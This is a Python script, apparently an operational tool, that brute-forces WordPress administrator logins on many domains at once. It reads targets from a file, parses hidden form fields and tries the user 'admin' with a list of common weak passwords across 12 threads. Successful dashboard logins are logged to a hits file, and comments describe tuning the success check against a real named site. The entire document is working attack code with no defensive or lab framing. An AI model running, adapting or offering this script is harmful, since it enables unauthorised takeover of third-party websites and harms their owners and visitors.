#!/usr/bin/env python3
"""wp_brute3.py - FIXED strict WordPress brute
Fixes wp_brute2 false positive (h5jz.net): wp-login.php path rewritten to front page
(adult site) still matched because check only required final URL contain 'wp-login',
NOT that the body actually contains the login form (user_login input).
Strict login-page detection: BOTH final URL contains wp-login AND body has user_login field.
"""
import urllib.request, urllib.parse, re, http.cookiejar
from concurrent.futures import ThreadPoolExecutor, as_completed

OUT = "/tmp/wp_brute3_hits.txt"
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
LOCK_ = __import__("threading").Lock()
PWS = ["admin123", "123456", "admin", "admin888", "12345678", "666888", "admin@123",
       "a123456", "admin123456", "123456789", "admin666", "888888", "000000", "123123",
       "admin2023", "admin2024", "admin2025", "Aa123456", "abc123456", "admin@2023",
       "123456a", "a123456789", "admin111", "123321", "5201314", "admin520", "qwer1234",
       "password", "1234567890", "admin1234", "1q2w3e4r", "pass123", "test123", "admin!@#",
       "admin2020", "admin2021", "admin2022", "12345", "654321", "qwerty", "abc123",
       "admin@123456", "admin888888", "13800138000", "admin666666", "woaini1314", "a123123"]

def get_opener():
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))

def fetch(op, url, timeout=10, data=None):
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None,
                                     headers={**UA, "Content-Type": "application/x-www-form-urlencoded"})
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, (e.geturl() if hasattr(e, "geturl") else url), e.read().decode("utf-8", "ignore")
    except Exception:
        return 0, url, ""

def log(s):
    with LOCK_:
        open(OUT, "a").write(s + "\n")

def check(domain):
    op = get_opener()
    code, final, body = fetch(op, "http://%s/wp-login.php" % domain)
    if code not in (200, 302):
        code, final, body = fetch(op, "https://%s/wp-login.php" % domain)
    if code != 200:
        return
    # STRICT: real WP login page must have user_login input in body
    # (h5jz.net: wp-login.php path rewritten to front page -> no user_login -> skip)
    if "user_login" not in body:
        return
    login_url = final if final.startswith("http") else "http://%s/wp-login.php" % domain
    hiddens = {}
    for m in re.finditer(r'<input[^>]*type=["\']hidden["\'][^>]*>', body, re.I):
        tag = m.group(0)
        nm = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
        vl = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
        if nm:
            hiddens[nm.group(1)] = vl.group(1) if vl else ""
    for pw in PWS:
        payload = dict(hiddens)
        payload.update({
            "log": "admin",
            "pwd": pw,
            "wp-submit": "Log In",
            "redirect_to": re.sub(r"https?://", "http://", login_url).replace("wp-login.php", "wp-admin/"),
            "testcookie": "1",
        })
        try:
            op2 = get_opener()
            code2, final2, resp = fetch(op2, login_url, data=urllib.parse.urlencode(payload))
            admin_url = final2 if "wp-admin" in final2 else re.sub(r"wp-login\.php.*", "wp-admin/", login_url)
            code3, final3, body3 = fetch(op2, admin_url)
            is_login = "user_login" in body3 or "wp-login" in final3.lower()
            has_dash = ("dashboard" in body3.lower() or "仪表盘" in body3 or "dashicons" in body3 or "wp-admin-bar" in body3)
            # EXTRA strict: dashboard body must reference wp-admin css (real admin chrome)
            real_admin = has_dash and not is_login and ("wp-admin/css" in body3 or "wp-admin-bar" in body3)
            if real_admin:
                log("!!! WP3 %s admin/%s" % (domain, pw))
                print("!!! WP3 HIT %s admin/%s" % (domain, pw), flush=True)
                return
        except Exception:
            continue
    print("  done %s" % domain, flush=True)

def main():
    doms = set()
    for line in open("/tmp/ra7_new_clean.txt"):
        d = line.split("\t")[0]
        doms.add(d)
    print("wp_brute3: %d targets" % len(doms), flush=True)
    with ThreadPoolExecutor(max_workers=12) as ex:
        futs = {ex.submit(check, d): d for d in doms}
        for fut in as_completed(futs):
            fut.result()
    print("[wp_brute3 done]", flush=True)

if __name__ == "__main__":
    main()
